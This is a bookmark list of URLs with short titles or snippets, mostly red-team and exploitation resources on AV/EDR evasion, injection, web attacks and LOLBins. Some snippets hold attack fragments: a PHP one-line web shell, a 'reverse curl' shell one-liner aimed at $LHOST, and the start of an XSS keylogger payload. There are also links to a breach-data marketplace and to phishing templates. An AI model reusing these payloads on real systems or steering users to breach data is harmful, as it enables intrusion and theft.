+https://iwantmore.pizza/posts/PEzor2.html,PEzor v2 — New Output Formats and Cobalt Strike Integration
+https://iwantmore.pizza/posts/PEzor.html,Designing and Implementing PEzor, an Open-Source PE Packer
+https://j00ru.vexillium.org/syscalls/nt/32/,Windows X86 System Call Table (NT/2000/XP/2003/Vista/2008/7/8/10). Author: Mateusz "j00ru" Jurczyk (
+https://j00ru.vexillium.org/syscalls/nt/64/,Windows X86-64 System Call Table (XP/2003/Vista/2008/7/2012/8/10). Author: Mateusz "j00ru" Jurczyk (
+https://jdhitsolutions.com/blog/active-directory/7817/distinguished-parsing-with-powershell-and-regex/,Distinguished Parsing with PowerShell and Regex
+https://jhalon.github.io/OSCE-Review/,OSCE Review
+https://jhalon.github.io/utilizing-syscalls-in-csharp-1/,Red Team Tactics: Utilizing Syscalls in C# - Prerequisite Knowledge
+https://jxy-s.github.io/herpaderping/,Detection Evasion Exploit
+https://kalilinuxtutorials.com/kawaiideauther-jam-wifi-clients-routers/,KawaiiDeauther is a pentest toolkit whose goal is to perform jam on WiFi clients/routers and spam ma
+https://kalitut.com/penetration-testing-resources/,Collection of Pentest Resources
+https://khchen.github.io/winim/clr.html,This module add Windows Common Language Runtime (CLR) support to Winim
+https://krabsonsecurity.com/2020/07/04/relying-on-usermode-data-is-a-bad-idea-aka-stop-trusting-the-enemy/,Relying on usermode data is a bad idea
+https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/,Bypassing Windows Defender Runtime Scanning
+https://labs.f-secure.com/blog/internet-exploiter-understanding-vulnerabilities-in-internet-explorer,Internet Exploiter: Understanding vulnerabilities in Internet Explorer
+https://labs.jumpsec.com/defending-your-malware/, Defending Your Malware
+https://ling.re/hardware-breakpoints/,Hardware breakpoints on Windows and common detection vectors
+https://linux-mm.org/,Navigation. RecentChanges · FindPage · HelpContents. Linux-mm.org is a wiki for documenting how memo
+https://lolbas-project.github.io/lolbas/Binaries/Cmstp/,Execute · AWL bypass. Installs or removes a Connection Manager service profile. Paths: C:\Windows\Sy
+https://l.wzm.me/_faq/etc/_etc/nodocs.progs.htm,Также недокументированные опции имеют и некоторые стандартные программы  имеющие графическую оболочк
+https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html,A place for me to store my notes/tricks for Windows Based Systems.
+https://m417z.com/Introducing-Winbindex-the-Windows-Binaries-Index/,Introducing Winbindex - the Windows Binaries Index
+https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html,In which we run a normal ELF binary on Linux without touching the filesystem(except /proc).
+https://malwareandstuff.com/taming-virtual-machine-based-code-protection-1/,Overcoming obfuscation in binaries has always been an interesting topic for me  especially in combin
+https://malware.pizza/2020/05/12/evading-av-with-excel-macros-and-biff8-xls/,Abusing legacy functionality built into the Microsoft Office suite is a tale as old as time. One fun
+https://malwareunicorn.org/workshops/re101.html,This workshop provides the fundamentals of reversing engineering (RE) Windows malware using a hands-
+https://maxkersten.nl/binary-analysis-course/binary-types/browser-plug-in/,Browser plug-in analysis
+https://medium.com/@0xHyde/yahoo-two-xssi-vulnerabilities-chained-to-steal-user-information-750-bounty-e9bc6a41a40a,two-xssi-vulnerabilities-chained-to-steal-user-information
+https://medium.com/@5yx/windows-event-log-to-the-dark-side-storing-payloads-and-configurations-9c8ad92637f2,Storing Payloads and Configurations in Windows Event Log using Powershell…
+https://medium.com/alphasoc/alexseys-ttps-1204d9050551,(.. Tactics  Techniques  and Procedures)
+https://medium.com/@amimahloof/how-to-package-a-python-project-with-all-of-its-dependencies-for-offline-install-7eb240b27418,How to package a python project with all of its dependencies for offline install
+https://medium.com/@asdqwedev/remote-image-upload-leads-to-rce-inject-malicious-code-to-php-gd-image-90e1e8b2aada,Remote Image Upload Leads to RCE (Inject Malicious Code to PHP-GD Image)
+https://medium.com/@Asm0d3us/weaponizing-favicon-ico-for-bugbounties-osint-and-what-not-ace3c214e139,Weaponizing favicon.ico for BugBounties , OSINT and what not
+https://medium.com/@benjamindbrown/finding-mcafee-a-case-study-on-geoprofiling-and-imagery-analysis-6f16bbd5c219,Identify past  current  and possible future locations through the geolocation and chronolocation of 
+https://medium.com/@bluedenkare/1-click-meterpreter-exploit-chain-with-beef-and-av-amsi-bypass-96b0eb61f1b6,The goal of this article is to demonstrate a working exploit chain step-by-step. The idea is to prov
+https://medium.com/@browninfosecguy/active-directory-lab-for-penetration-testing-5d7ac393c0c4,I have been asked by few peeps on how to setup an Active Directory lab for penetration testing. In t
+https://medium.com/@buff3r/basic-buffer-overflow-on-64-bit-architecture-3fb74bab3558,A beginner’s guide to buffer overflow.
+https://medium.com/bugbountywriteup/awae-oswe-review-from-a-non-developer-perspective-2c2842cfbd4d,Earlier this year I had participated in Advanced Web Application Exploitation course by Offensive Se
+https://medium.com/bugbountywriteup/sql-injection-using-unicode-characters-8d360ead379c,Is your application not responding for normal SQL Injection payloads? Your application might be usin
+https://medium.com/bugbountywriteup/things-i-learned-after-rooting-25-hack-the-box-machines-e9eada4ea6ca,Hack  Sleep  Repeat.
+https://medium.com/ctf-writeups/union-sqli-challenges-zixem-write-up-4e74ad4e88b4,I’ve always avoided learning more about SQL Injections  since they’ve always seemed like quite a dau
+https://medium.com/@D00MFist/going-4-a-run-5d425298f1d4,Another Go Shellcode Runner
+https://medium.com/@DebugActiveProcess/data-exfiltration-with-lolbins-4d9c6e43dacf,The term “living off the land” (LOL) was coined by malware researchers Christopher Campbell and Matt
+https://medium.com/@dimazarno/bypassing-email-filter-which-leads-to-sql-injection-e57bcbfc6b17,Bypassing Email Filter which leads to SQL Injection
+https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6,Introduction To Hooking
+https://medium.com/@georgiaweidman/exploit-development-space-issues-a-relative-jump-1faa72730f6e,Space issues Exploit development
+https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5,Authenticated Arbitrary Command Execution on PostgreSQL 9.3
+https://medium.com/@gupta.bless/exploiting-xxe-for-ssrf-c23892374c0c,Retrieving IAM credentials of EC2 instance using xxe and ssrf
+https://medium.com/@kamran.bilgrami/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f,Ethical Hacking Lessons — Building Free Active Directory Lab in Azure
+https://medium.com/@laughing_mantis/malicious-shapes-in-office-part-2-910375cd05f3,Red Team: Abusing EnhMetaFileBits and AddPicture for VBA Malware (VBA-Stendhal)
+https://medium.com/@LucaBongiorni/hacking-iot-devices-with-focaccia-board-8c4e009ed488,A Multipurpose Breakout Board to hack hardware in a clean and easy way!
+https://medium.com/@mase289/a-tale-of-my-first-ever-full-ssrf-bug-4fe71a76e9c4,SSRF BUG Report
+https://medium.com/@maverickNerd/recon-everything-48aafbb8987,Bug Bounty Hunting Tip #1- Always read the Source Code
+https://medium.com/maverislabs/proxyjump-the-ssh-option-you-probably-never-heard-of-2d7e41d43464,SSH Option
+https://medium.com/@n0tty/tracking-any-user-location-with-ip-address-using-google-api-9b58d8c62f89,If you think your geolocation coordinates are safe by only turning of your user location on your pho
+https://medium.com/@ourtechhub.com/get-cydia-for-free-ios-13-4-1-13-4-5-beta-download-links-checkra1n-0-10-1-jailbreak-9b2ba71ef81c,CheckRa1n beta 0.10.1 update just released adding iOS 13.4.1 — iOS 13.4.5 Jailbreak support. Also  t
+https://medium.com/@polarply/build-your-first-llvm-obfuscator-80d16583392b,Welcome to a tutorial on building your first LLVM based obfuscator. In this post we will list the ad
+https://medium.com/rungo/building-rpc-remote-procedure-call-network-in-go-5bfebe90f7e9,RPC is an inter-process communication architecture to facilitate easy communication between two mach
+https://medium.com/@rvrsh3ll/using-the-interplanetary-file-system-for-offensive-operations-2350f46240cf,Using the InterPlanetary File System For Offensive Operations
+https://medium.com/@ryancor/reverse-engineering-encrypted-code-segments-b01aead67701,While working on a reverse engineering project  I came across a binary that appeared to be malformed
+https://medium.com/@sechunter/js-is-love-%EF%B8%8F-ca393a4849e9,$5K for Rest API Key.
+https://medium.com/secjuice/waf-evasion-techniques-718026d693d8,I can read your passwd file with: “/???/??t /???/??ss??”. Having fun with Sucuri WAF  ModSecurity  P
+https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962,Now  considering the knowledge gained earlier in Part I  let’s understand SeImpersonatePrivilege whi
+https://medium.com/@seemant.bisht24/understanding-and-abusing-process-tokens-part-i-ee51671f2cfa,Understanding and Abusing Process Tokens — Part I
+https://medium.com/sourav-sahana/bypass-2fa-in-a-website-d616eaead1e3,2fa Bypass Report
+https://medium.com/@soyelmago/bugbounty-tips-continuously-updated-dd8fe8914bdc,Here you can find tips for BugBountys
+https://medium.com/@sshell_/bypassing-av-detections-the-dumb-way-part-1-4e13cc973390,Dumb AV bypass
+https://medium.com/@swapmaurya20/password-reset-poisoning-leading-to-account-takeover-f178f5f1de87,Account take over report
+https://medium.com/swlh/intro-to-reverse-engineering-45b38370384,Analyzing and Hacking Binaries with Ghidra.
+https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e,Hello Everyone 
+https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997,Bypassing Powershell Constrained Language mode
+https://medium.com/@vignesh4303/reverse-engineering-resources-beginners-to-intermediate-guide-links-f64c207505ed,Hacking Resources
+https://medium.com/@viveik.chauhan/how-i-bypass-crowdstrike-restriction-1bc558abd464,CrowdStrike Bypass
+https://medium.com/walmartlabs/dos-file-path-magic-tricks-5eda7a7a85fa,DOS File Path Magic Tricks
+https://mega.nz/?_escaped_fragment_=tdMGnIwb!NyTVaKhahP8dQypmf1Z10Gy-Lx_9HyaRuVxiSkX7p-M,MEGA provides free cloud storage with convenient and powerful always-on privacy. Claim your free 50G
+https://metabytezero.blogspot.com/2019/08/writing-disassembler.html,Write a debugger. Write a disassembler. C++ debugger libbfd binutils-dev
+https://mholt.github.io/json-to-go/,This tool instantly converts JSON into a Go type definition. Paste a JSON structure on the left and 
+https://mijailovic.net/2019/01/03/sharpfuzz/,SharpFuzz: Bringing the power of afl-fuzz to .NET platform
+https://miner.datadrifter.xyz/,View Amazon S3 and Google Cloud storage buckets easily!
+https://modexp.wordpress.com/2019/06/03/disable-amsi-wldp-dotnet/,Introduction Previous Research AMSI Example in C AMSI Context AMSI Initialization AMSI Scanning CLR 
+https://modexp.wordpress.com/2020/07/07/wpi-wm-paste/,Introduction Edit Controls Writing CP-1252 Compatible Code Initialization Set RAX to 0 Set RAX to 1 
+https://mpgn.gitbook.io/crackmapexec/getting-started/installation/installation-for-docker,Use CrackMapExec with Docker
+https://msitpros.com/?p=2012,Hacking technique – DLL hijacking
+https://mxtoolbox.com/domain,Domain setup checker online tools
+https://mystiko.sh/?p=635,What Is DLL Forwarding ? DLL forwarding is a technique in which a dll forward all faction request to
+https://n4r1b.com/posts/2020/04/dissecting-the-windows-defender-driver-wdfilter-part-4/,Welcome back to Dissecting the Windows Defender Driver  in the previous part we saw how WdFilter man
+https://n4r1b.netlify.com/posts/2020/03/dissecting-the-windows-defender-driver-wdfilter-part-3/,Welcome back to Dissecting the Windows Defender Driver  in the previous part we saw how WdFilter han
+https://nekosecurity.com/x86-64-shellcoding/part-2-shellcode-creation,Exploit development  Assembly  Exploitation  Tutorials  x64
+https://netsec.expert/2020/02/01/xss-in-2020.html,Actual XSS in 2020
+https://nim-lang.org/,The Nim programming language is a concise  fast programming language that compiles to C  C++ and Jav
+https://norfolkinfosec.com/a-new-look-at-old-dragonfly-malware-goodor/,A New Look at Old Dragonfly Malware (Goodor)
+https://nostarch.com/GhidraBook,The Ghidra Book is a practical introduction to Ghidra  a comprehensive  open-source tool suite for r
+https://ntamonsec.blogspot.com/2020/07/cobalt-strike-aggressor-scripts-ception.html,Cobalt Strike Aggressor Scripts-Ception
+https://null-byte.wonderhowto.com/how-to/execute-code-microsoft-word-document-without-security-warnings-0180495/,Execute Code in a Microsoft Word Document Without Security Warnings 
+https://null-byte.wonderhowto.com/how-to/pop-reverse-shell-with-video-file-by-exploiting-popular-linux-file-managers-0196078/,Pop a Reverse Shell with a Video File by Exploiting Popular Linux File Managers 
+https://nuzzel.com/InfoSecSherpa/2020/06/29,Mon  Jun 29 2020: InfoSecSherpa (InfoSecSherpa) Newsletter on Nuzzel. Subscribe to InfoSecSherpa's N
+https://o365blog.com/post/aad-deepdive/, Deep-dive to Azure Active Directory Identity Federation
+https://oalabs.openanalysis.net/2019/02/18/windbg-for-malware-analysis/,Simple beginner tutorial for malware analysis using WinDbg. Everything you need to get started debug
+https://offensivedefence.co.uk/posts/assembly-resolve/,AppDomain.AssemblyResolve
+https://offensivedefence.co.uk/posts/covenant-profiles-templates/,Using Custom Covenant Listener Profiles & Grunt Templates to Elude AV
+https://offensivedefence.co.uk/posts/dnlib-dllexport/,Adding DLL Exports with dnlib
+https://offensivedefence.co.uk/posts/making-amsi-jump/,Making AMSI Jump
+https://offensive-terraform.github.io/,Automated multi step offensive attack modules with Infrastructure as Code(IAC)
+https://offlinemark.com/2020/10/14/demand-paging/,This post details my adventures with the Linux virtual memory subsystem  and my discovery of a creat
+https://osandamalith.com/2019/08/26/converting-an-exe-to-a-dll/,I’ve been doing some crazy experiments on running an EXE as a DLL. Here are some parts of my researc
+https://ourcodeworld.com/articles/read/471/how-to-encrypt-and-decrypt-files-using-the-aes-encryption-algorithm-in-c-sharp,How to encrypt and decrypt files using the AES encryption algorithm in C#
+https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/,dive into Excel 4.0 macros (also called XLM macros – not XML) for offensive 
+https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/,explore the use of direct system calls  restore hooked API calls 
+https://outflank.nl/blog/2020/12/26/direct-syscalls-in-beacon-object-files/,explore the use of direct system calls within Cobalt Strike Beacon Object File
+https://parsiya.net/blog/2020-05-09-thick-client-proxing-part-10-the-hosts-file/,Thick Client Proxying - Part 10 - The hosts File
+https://pentestlaboratories.com/2020/01/27/msbuild-without-msbuild/,MSBuild Without MSBUILD
+https://perishablepress.com/stupid-htaccess-tricks/,An extensive htaccess reference including many htaccess tips  tricks  and examples. Enhance the func
+https://platypusattack.com/,Side Channel Attack on intel
+https://poison.digi.ninja/,A lab to play with various web cache poisoning vulnerabilities.
+https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn,HTTP Desync Attacks: Request Smuggling Reborn
+https://portswigger.net/blog/so-you-want-to-be-a-web-security-researcher,You want to be a web security researcher
+https://portswigger.net/blog/web-security-academy-your-questions-answered,Web Security Academy - your questions answered
+https://portswigger.net/burp/documentation/desktop/tools/proxy/options/invisible,Burp's support for invisible proxying allows non-proxy-aware clients to connect directly to a Proxy 
+https://portswigger.net/daily-swig,Cyber Security News
+https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets,Evading defences using VueJS script gadgets
+https://portswigger.net/research/server-side-template-injection,Server Side Template Injection
+https://portswigger.net/research/top-10-web-hacking-techniques-of-2019-nominations-open,Top Ten Web Hacking Techniques of 2019
+https://portswigger.net/web-security/cross-site-scripting,Cross Site Scripting
+https://portswigger.net/web-security/request-smuggling,HTTP Request Smuggling
+https://posts.specterops.io/adventures-in-dynamic-evasion-1fe0bac57aa,Adventures in Dynamic Evasion
+https://posts.specterops.io/covenant-v0-5-eee0507b85ba,Covenant v0.5
+https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1,Hunting in Active Directory: Unconstrained Delegation & Forests Trusts
+https://posts.specterops.io/malware-development-pt-1-dynamic-module-loading-in-go-1121f07f3a5a,Loading and managing shared libraries in memory.
+https://posts.specterops.io/methodology-for-static-reverse-engineering-of-windows-kernel-drivers-3115b2efed83,Methodology for Static Reverse Engineering of Windows Kernel Drivers
+https://posts.specterops.io/satellite-a-payload-and-proxy-service-for-red-team-operations-aa4500d3d970,Satellite: A Payload and Proxy Service for Red Team Operations
+https://posts.specterops.io/sparkling-payloads-a2bd017095c,Leveraging Notarized Payloads and Sparkle for Initial Access
+https://powershell.one/tricks/assemblies/load-from-memory,Loading .NET Assemblies From Memory
+https://privsecguy.medium.com/hping3-to-meet-you-on-the-other-side-of-the-firewall-4836e8ab5e8c,Hping3 to Meet You on the Other Side of the Firewall
+https://public.support.unisys.com/framework/publicterms.aspx?returnurl=%2Ffinancial%2Fiif%2Fpdf2%2FDTM-ini-Param.pdf,Desktop .ini Parameters Ref Manual
+https://pulsesecurity.co.nz/articles/postgres-sqli.html,SQL Injection and Postgres - An adventure to eventual RCE
+https://raidforums.com/,RaidForums is a database sharing and marketplace forum. We have exclusive database breaches and leak
+https://rastamouse.me/blog/process-injection-dinvoke/,Offensive Security Engineering & Shenanigans
+https://reactos.org/,Imagine running your favorite Windows applications and drivers in an open-source environment you can trust
+https://redteaming.co.uk/2020/07/12/dll-proxy-loading-your-favorite-c-implant/,DLL Side-Loading or DLL Proxy loading allows an attacker to abuse a legitimate and typically signed 
+https://repnz.github.io/posts/apc/user-apc/,APC Series: User APC API
+https://repnz.github.io/posts/apc/wow64-user-apc/,APC Series: KiUserApcDispatcher and Wow64
+https://research.checkpoint.com/2020/graphology-of-an-exploit-playbit/,Exploit Developer Spotlight: The Story of PlayBit
+https://research.checkpoint.com/2020/reverse-rdp-the-path-not-taken/,Reverse RDP – The Path Not Taken
+https://reverseengineering.stackexchange.com/,Q&A for researchers and developers who explore the principles of a system through analysis of its st
+https://rjmaccready.wordpress.com/2013/05/08/know-your-headers-x-originating-ip/,A lot of useful information can be gathered from email headers when viewing a message’s properties i
+https://s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/,This blog post will cover some lets say more advanced AMSI triggers. I decided to build a custom Inv
+https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/,This is my very first blog post. Its about how to manually change AMSI signatures/triggers to bypass
+https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/,Bypassing Windows protection mechanisms & Playing with OffensiveNim
+https://scannell.me/fuzzing-for-ebpf-jit-bugs-in-the-linux-kernel/,Fuzzing for bugs in linux kernel
+https://scorpiosoftware.net/2021/01/10/parent-process-vs-creator-process/,Parent Process vs. Creator Process
+https://secret.club/2020/04/23/directory-deletion-shell.html,From directory deletion to SYSTEM shell
+https://secureyourit.co.uk/wp/2020/04/17/amsi-in-the-heap/,AMSI in the HEAP x32
+https://securism.wordpress.com/oscp-notes-exploitation/,PHP One line shell <?php echo shell_exec($_GET[‘cmd’]);?> <?php system(‘dir’);?> Default installatio
+https://securityaffairs.co/wordpress/91723/hacking/usbsamurai-bypass-air-gapped-environments.html,The popular researcher Luca Bongiorni described how to make a malicious USB Implant (USBsamurai) tha
+https://securityonline.info/hetty-http-toolkit-for-security-research/,Hetty is an HTTP toolkit for security research.
+https://security-tzu.com/2020/10/22/manage-active-directory-objects-with-adsi/,Manage Active Directory objects with ADSI
+https://shazow.net/posts/ssh-how-does-it-even/,Why aren’t we using SSH for everything?
+https://shells.systems/in-memory-shellcode-decoding-to-evade-avs/,In-Memory shellcode decoding to evade Avs/EDRs
+https://sherlock-project.github.io/,Sherlock Project. Sherlock  a powerful command line tool provided by Sherlock Project  can be used t
+https://silentbreaksecurity.com/srdi-shellcode-reflective-dll-injection/,sRDI – Shellcode Reflective DLL Injection
+https://skelsec.medium.com/duping-av-with-handles-537ef985eb03,In this article I’m describing yet another way to bypass AV detection/blocking access to LSASS proce
+https://slaeryan.github.io/posts/midnighttrain.html,Introducing MIDNIGHTTRAIN - A Covert Stage-3 Persistence Framework weaponizing UEFI variables
+https://social.msdn.microsoft.com/Forums/vstudio/en-US/9bde4870-1599-4958-9ab4-902fa98ba53a/how-do-i-maximizeminimize-applications-programmatically-in-c?forum=csharpgeneral,maximize/minimize applications programmatically in C#
+https://social.msdn.microsoft.com/Forums/vstudio/en-US/f2d88949-2de7-451a-be47-a7372ce457ff/send-windows-key?forum=csharpgeneral,Send windows Key programmatically
+https://social.technet.microsoft.com/Forums/office/en-US/74b0e6f5-f90f-42b5-9658-3fe26f9db2d9/scf-files-windows-explorer-command-file-quotscriptingquot-documentation?forum=ITCG,SCF files (Windows Explorer Command file) "scripting" documentation
+https://solstice.sh/workshops-advanced-wireless-attacks/,Advanced Wireless Attacks Against Enterprise Networks (AWAE) (v3.0.1)
+https://speakerdeck.com/campoy/an-introduction-to-go-cern,An Introduction to Go (CERN) 
+https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html,Remote Code Execution Against SharePoint Server Abusing DataSet
+https://stackoverflow.com/questions/2229822/best-practices-considerations-when-writing-html-emails,Best Practices & Considerations when writing HTML Emails [closed]
+https://store.planetcom.co.uk/,An ultra-thin mobile enabled smartphone with integrated tactile keyboard for typing and creating on 
+https://suchsecurity.com/intro-to-vulnerability-research-debugging-and-intro-to-windbg.html,An overview of general debugging concepts in the context of vulnerability research and the basics of Windbg
+https://superuser.com/questions/1467958/why-does-putting-a-dot-after-the-url-remove-login-information,Why does putting a dot after the URL remove login information?
+https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/,Attacking MS Exchange Web Interfaces
+https://swarm.ptsecurity.com/kerberoasting-without-spns/,You don't need SPNs in the Kerberoasting attack
+https://syfuhs.net/what-happens-when-you-type-your-password-into-windows,What Happens When you Type Your Password into Windows?
+https://teamhydra.blog/2020/10/12/in-process-execute-assembly-and-mail-slots/,In Process Execute Assembly and Mail Slots
+https://templated.co/,Site Templates Good For Phishing Campaigns
+https://thecyberviking.com/?page_id=217895,OSINT Blog
+https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/,Exploiting directory permissions on macOS
+https://thevivi.net/2017/03/19/aix-for-penetration-testers/,AIX for Penetration Testers
+https://thewover.github.io/Dynamic-Invoke/,Presenting DInvoke  a new API in SharpSploit that acts as a dynamic replacement for PInvoke. U
+https://thewover.github.io/Introducing-Donut/,You can now inject .NET Assemblies into Windows processes using this repo: https://github.com/
+https://tldrsec.com/blog/lesser-known-aws-attacks/,Techniques for initital access  recon  lateral movement  and exfil of AWS accounts  along with defen
+https://towardsdatascience.com/a-complete-anomaly-detection-algorithm-from-scratch-in-python-step-by-step-guide-e1daf870336e,Anomaly Detection Algorithm Using the Probabilities
+https://towardsdatascience.com/illustrated-guide-to-lstms-and-gru-s-a-step-by-step-explanation-44e9eb85bf21,Illustrated Guide to LSTM’s and GRU’s: A step by step explanation
+https://towardsdatascience.com/three-functions-to-know-in-python-4f2d27a4d05,Learn how to use the map  filter  and reduce functions in python
+https://trustfoundry.net/basic-rop-techniques-and-tricks/,Basic ROP Techniques and Tricks Intro During assessments  we’ll occasionally run across custom binar
+https://twitter.com/0gtweet/status/1222061272331685888,“#redteam tip: use logman.exe with -b  -rf  -s  and -rc to create highly-privileged local  and remot
+https://twitter.com/0gtweet/status/1236960061873967104,“Want to see all undocumented parameters of certutil.exe? 1. run "certutil -?" under #WinDbg 2. bp c
+https://twitter.com/0gtweet/status/1280615036713664513,“Did you expect this? Especially  an undocumented "-encodedarguments" #PowerShell parameter. It may 
+https://twitter.com/0gtweet/status/1281103918693482496,“Yet another #PowerShell #redteam tip: use (WCHAR)0x2013  (WCHAR)0x2014  or (WCHAR)0x2015 instead of
+https://twitter.com/0xhexmex/status/1281255967368372225,“Quick list of some app whitelist bypasses to try..  forfiles /p c:\windows\system32 /m notepad.exe 
+https://twitter.com/33y0re/status/1259344960391991298,“WriteProcessMemory() ROP chain was really interesting compared to using common APIs like VirtualPro
+https://twitter.com/alra3ees/status/1191157765282156544,“OSWE Preparation resources:-  CC @inishantsinha  Good luck for your exam.  https://t.co/vzK8gGI3mP 
+https://twitter.com/andreabarisani/status/1187353379401547776,“We are so excited to announce TamaGo: bare metal Go for ARM SoCs.  This project allows  with minima
+https://twitter.com/aprilwright/status/1204481135536943104,“OooOoh!  https://t.co/WeeI8cYrrH DemonSeed EDU is a hardware implant for making good USB cables bad
+https://twitter.com/bayufedraa/status/1232946137763442688,“#BugBounty #BugBountyTips #XSS If the program replace all user input in the tag (ex: <h1> <script> 
+https://twitter.com/bhinfosecurity/status/1195326863217954816,“BHIS | #InfoSec Webcast - Available Now!  Weaponizing Active Directory w/ @6fletch9 Recorded: 8/1/2
+https://twitter.com/bohops/status/986984122563391488,“Is Explorer.exe the ultimate #lolbin?  explorer.exe [exe/hta/scr/...etc]  *Invokes child processes 
+https://twitter.com/campuscodi/status/1187987222357786625,“Nasty PHP7 RCE exploited in the wild  -PoC published on GitHub -RCE works only on PHP7+Nginx+PHP-FP
+https://twitter.com/carlillo/status/1183095842619699200,“#JavaScript tips 🧙‍♂️🧙‍♀️: Refactoring nested if using the in operator and a factory👨‍🏭!  #typescri
+https://twitter.com/catalinmpit/status/1336659813565157377,“GitHub repos to help you crush your job interviews:  1. https://t.co/UlQiARAQur 2. https://t.co/LH6
+https://twitter.com/cglyer/status/1222328847686885376,“Commands to image Netscaler device:  dd if=/dev/md0 | gzip -1 - | ssh user@[IP address] dd of=/[ful
+https://twitter.com/curi0usjack/status/1190296092904165384,“Remove metadata from Office 2016 documents using the built-in Document Inspector. What a great feat
+https://twitter.com/cyberraiju/status/1273597319322058752,“Red Team Tip:   'explorer.exe /root' can be run from the command line  - similar to 'cmd.exe /c'  o
+https://twitter.com/cyberwarship/status/1281874042518220800,“AD Attack  1) Performing domain recon using PS https://t.co/Pt6VpJqGdO  2) Attack mapping with bloo
+https://twitter.com/damian_89_/status/1250721398747791360,“Simple #bugbountytip: when dealing with laravel symfony slim lumen (or generel php) applications  c
+https://twitter.com/devinstokes/status/1194029354222673921,“Remote XSS Keylogger:  Payload: <svg/onload=setTimeout(function(){d=document;z=d.createElement("scr
+https://twitter.com/dinosn/status/1147943666016837633,“Linux for Pentester: git Privilege Escalation https://t.co/qIwt9XU2LH”
+https://twitter.com/egyp7/status/1234995044613906433,“If you want to see what a Metasploit exploit that uses HTTP is doing  `set HttpTrace true` will cau
+https://twitter.com/egyp7/status/1286688951865094145,“Need to join some lines of text? xargs(1) has you covered. #bashTricks”
+https://twitter.com/falsneg/status/1202788236562579456,“Use the MS-signed executable "dvdplay.exe" #lolbin to run your binaries”
+https://twitter.com/filosottile/status/1229093553269362689,“https://t.co/MSn1TF8ii2  the SSH server that knows who you are  got some newly refreshed intel! Try
+https://twitter.com/frankdenneman/status/1275843852230971394,“I found this on imgur: some ways to apply thermal paste and the result By henriquesantosbr #Homelab
+https://twitter.com/german_hermit/status/1190744586689363968,“@MalwareTechBlog with the thread being deleted  and until the blog post shows up  here a few screen
+https://twitter.com/glytchtech/status/1185609805521514498,Tricks for soldering
+https://twitter.com/golangweekly/status/1258517467577503744,“Mockery: A Mock Code Generator for Go Interfaces - https://t.co/zUkrWdSMxj”
+https://twitter.com/hackanddo/status/1212843282696482818,“lsassy 1.0.0 is finally out ! 🔸 Remotely dump #lsass **with built-in Windows tools only**  procdump
+https://twitter.com/hackerhumble/status/1274314917907030017,“JWT Token Bypasses #2:  1. Capture the JWT token. 2. If the algorithm is RS256 change to HS256 and 
+https://twitter.com/hackers_bot/status/1278485064339333123,“Hack the planet! https://t.co/N49jlb7lvL”
+https://twitter.com/hackingdave/status/1221259449651924993,“Fun one - I’ve used a PS script that has comments explaining that it’s a test script for backwards 
+https://twitter.com/huntmost/status/1192670565963911169,“RCE on PDF upload:  Content-Disposition: form-data; name="fileToUpload"; filename="pwn.pdf" Content
+https://twitter.com/hussein98d/status/1193318004257435648,“Sharing one of my secrets #BugBountyTip When discovering subdomains/domains/assets owned by a compa
+https://twitter.com/hussein98d/status/1219350752411430913,“Time for a new #bugbounty tip! When I sign up to a website/newsletter/reset password  I look at the
+https://twitter.com/hussein98d/status/1219750207287676933,“#BugBountyTip time: when you see a POST request made with JSON  convert this to XML and test for XX
+https://twitter.com/iancoldwater/status/1246464421741936648,“When someone told me that putting a dot after a URL like https://t.co/aq1qJ7V3Pt./article-name brea
+https://twitter.com/imrannissar3/status/1213476745019453441,“Print all git repos from a user                                          curl -s https://t.co/QAlBn
+https://twitter.com/in127pkt/status/1221497009812705280,“Learn Reversing/Bin Exploitation: https://t.co/8fF8RdAz7r Practice: https://t.co/RiFqgRXirT https:/
+https://twitter.com/inonshkedy/status/1213494977277448192,“-API TIP: 4/31- Testing a Ruby on Rails App & noticed an HTTP parameter containing a URL? Developer
+https://twitter.com/intigriti/status/1181904057063133186,“Drop your exotic XSS payloads! 👇”
+https://twitter.com/jedimammoth/status/1284679803984138246,“Old Kali instance not updating because the key is expired?  apt-key adv --keyserver hkp://keys.gnup
+https://twitter.com/jhaddix/status/1315755608851668993,“Just FYI my content discovery file is:  https://t.co/dVfEfNZXF0  My subdomain enumeration file is: 
+https://twitter.com/jlynx_darkn3ss/status/1217341474699743232,“Built a little device that sits next to the alarm in the house to let us know who is currently home
+https://twitter.com/joevennix/status/1258613994681544704,“reverse curl 🦾 is a solid payload:  P=$(mktemp -u);mkfifo $P;curl -sNkT . https://$LHOST:$LPORT<$P|
+https://twitter.com/jxjputaoshu/status/1205109160939008001,“open-source Wi-Fi baseband chip/FPGA design  openwifi is online: https://t.co/YqFj0rthTJ . full sta
+https://twitter.com/kirkdborne/status/1335660445735268356,“Make Your Twitter Feed Artificial Intelligence-Friendly: https://t.co/wMFozoC82I  —————— #BigData #
+https://twitter.com/kitploit/status/1226839845701636096,“Pytm - A Pythonic Framework For Threat Modeling https://t.co/y2jiHlAO7Z”
+https://twitter.com/kjvalentine/status/1147263888641200128,“Alright folks  one can now pre-order sneakers from my HackAttack sneaker line. I advise:  1. Order 
